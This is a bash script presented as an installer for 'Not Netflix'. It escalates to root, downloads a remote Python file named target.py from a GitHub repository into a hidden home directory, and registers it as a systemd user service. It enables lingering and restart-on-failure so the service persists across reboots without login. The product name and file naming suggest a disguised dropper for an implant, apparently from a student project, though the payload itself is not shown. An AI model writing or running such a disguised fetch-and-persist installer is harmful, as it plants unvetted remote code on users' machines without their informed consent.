#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[*] Re-running as root using sudo..."
  exec sudo "$0" "$@"
fi

# Determine the original user
REAL_USER=${SUDO_USER:-$(logname)}
USER_HOME=$(eval echo "~$REAL_USER")

echo "[*] Installing Not Netflix as user: $REAL_USER"

# Config
INSTALL_DIR="$USER_HOME/.not_netflix"
SCRIPT_URL="https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
PYTHON=$(which python3)

# Create directory
mkdir -p "$INSTALL_DIR"
curl -sL "$SCRIPT_URL" -o "$INSTALL_DIR/target.py"
chown "$REAL_USER":"$REAL_USER" -R "$INSTALL_DIR"

# Systemd user service
SERVICE_DIR="$USER_HOME/.config/systemd/user"
mkdir -p "$SERVICE_DIR"
chown -R "$REAL_USER":"$REAL_USER" "$SERVICE_DIR"

cat <<EOF > "$SERVICE_DIR/not-netflix.service"
[Unit]
Description=Not Netflix Service
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON $INSTALL_DIR/target.py
Restart=on-failure

[Install]
WantedBy=default.target
EOF

chown "$REAL_USER":"$REAL_USER" "$SERVICE_DIR/not-netflix.service"

# Enable lingering
if ! loginctl show-user "$REAL_USER" | grep -q 'Linger=yes'; then
  echo "[*] Enabling lingering for $REAL_USER..."
  loginctl enable-linger "$REAL_USER"
fi

# Reload and enable service
sudo -u "$REAL_USER" systemctl --user daemon-reexec
sudo -u "$REAL_USER" systemctl --user daemon-reload
sudo -u "$REAL_USER" systemctl --user enable not-netflix
sudo -u "$REAL_USER" systemctl --user start not-netflix

echo "[+] Installed Not Netflix as a systemd user service for $REAL_USER."
